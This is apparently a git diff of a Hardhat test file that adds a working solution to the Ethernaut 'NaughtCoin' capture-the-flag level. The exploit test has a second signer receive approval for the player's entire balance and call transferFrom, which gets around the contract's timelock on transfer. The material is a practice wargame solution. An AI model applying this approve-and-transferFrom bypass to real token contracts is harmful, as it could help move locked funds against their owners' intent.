@@ -6,11 +6,12 @@ const { setupLevel } = require("./utils");
 describe("NaughtCoin", async function () {
     let deployer;
     let player;
+    let friend;
     let factory;
     let instance;
 
     before(async function () {
-        [deployer, player] = await ethers.getSigners();
+        [deployer, player, friend] = await ethers.getSigners();
 
         level = await setupLevel("NaughtCoin", player.address);
         factory = level.factory;
@@ -18,7 +19,9 @@ describe("NaughtCoin", async function () {
     });
 
     it("Exploit", async function () {
-
+        const bal = await instance.balanceOf(player.address);
+        await instance.connect(player).approve(friend.address, bal);
+        await instance.connect(friend).transferFrom(player.address, friend.address, bal);
     });
 
     after(async function () {
